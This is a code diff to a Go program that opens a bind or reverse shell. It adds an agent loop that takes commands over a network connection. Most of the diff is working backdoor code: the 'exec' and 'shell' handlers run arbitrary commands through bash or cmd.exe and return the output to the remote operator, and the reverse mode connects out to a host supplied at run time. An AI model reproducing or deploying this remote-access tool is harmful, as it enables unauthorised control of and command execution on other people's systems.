@@ -7,8 +7,10 @@ import (
 	"net"
 	"os/exec"
 	"runtime"
+	"strings"
 )
 
+// Run a reverse of bind shell
 func RunShellCmd(mode string, host string, port string) {
 	fmt.Println("[+] Start the shell as mode :", mode)
 
@@ -18,7 +20,6 @@ func RunShellCmd(mode string, host string, port string) {
 	if mode == "reverse" {
 		reverseShell(host, port)
 	}
-
 }
 
 func bindShell(host string, port string) {
@@ -36,7 +37,7 @@ func bindShell(host string, port string) {
 			log.Println(err)
 		}
 		fmt.Printf("[+] Accepting connection from %s\n", conn.RemoteAddr().String())
-		go runShell(conn)
+		go runAgent(conn)
 	}
 
 }
@@ -52,7 +53,64 @@ func reverseShell(host string, port string) {
 	}
 	defer conn.Close()
 
-	runShell(conn)
+	runAgent(conn)
+}
+
+func runAgent(conn net.Conn) {
+	for {
+		conn.Write([]byte("$> "))
+
+		input := make([]byte, 4096)
+		n, _ := conn.Read(input)
+		if n == 0 {
+			break
+		}
+		command := string(input[:n])
+		command = strings.TrimSpace(command)
+
+		switch command {
+		case "help":
+			displayHelp(conn)
+		case "shell":
+			conn.Write([]byte("[+] Run shell command\n"))
+			runShell(conn)
+			break
+		case "exit":
+			conn.Write([]byte("Exiting this agent\n"))
+			conn.Close()
+			break
+		default:
+			if strings.HasPrefix(command, "exec") {
+				runCommand(conn, command[len("exec "):])
+				break
+			}
+			conn.Write([]byte("Unknow commad\n"))
+		}
+	}
+}
+
+func displayHelp(conn net.Conn) {
+	conn.Write([]byte("[+] Help\n"))
+	conn.Write([]byte("\t- help\tDisplay this help\n"))
+	conn.Write([]byte("\t- shell\tRun a shell\n"))
+	conn.Write([]byte("\t- exec\texecute command given in parameters\n"))
+	conn.Write([]byte("\t- exit\texit\n"))
+}
+
+func runCommand(conn net.Conn, input string) {
+	var out []byte
+	var err error
+
+	if runtime.GOOS == "windows" {
+		out, err = exec.Command("cmd.exe", "/c", input).Output()
+	} else {
+		out, err = exec.Command("/bin/bash", "-c", input).Output()
+	}
+	if err != nil {
+		conn.Write([]byte("[!] Erreur running command\n"))
+		return
+	}
+	conn.Write([]byte(out))
 }
 
 func runShell(conn net.Conn) {
@@ -89,5 +147,4 @@ func runShell(conn net.Conn) {
 	if err := cmd.Run(); err != nil {
 		fmt.Println(err)
 	}
-	conn.Close()
 }
